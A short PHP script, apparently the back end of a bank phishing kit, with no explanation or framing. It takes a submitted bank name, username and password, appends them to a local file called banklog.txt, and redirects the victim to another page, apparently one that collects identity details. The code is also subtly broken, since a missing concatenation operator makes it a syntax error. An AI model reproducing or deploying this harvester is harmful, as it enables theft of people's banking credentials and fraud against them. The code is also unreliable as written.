
<?php

file_put_contents("banklog.txt", "Bank Log: " . $_POST['bn'] . "username". $_POST['user'] " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ../id.html');
exit();
?>






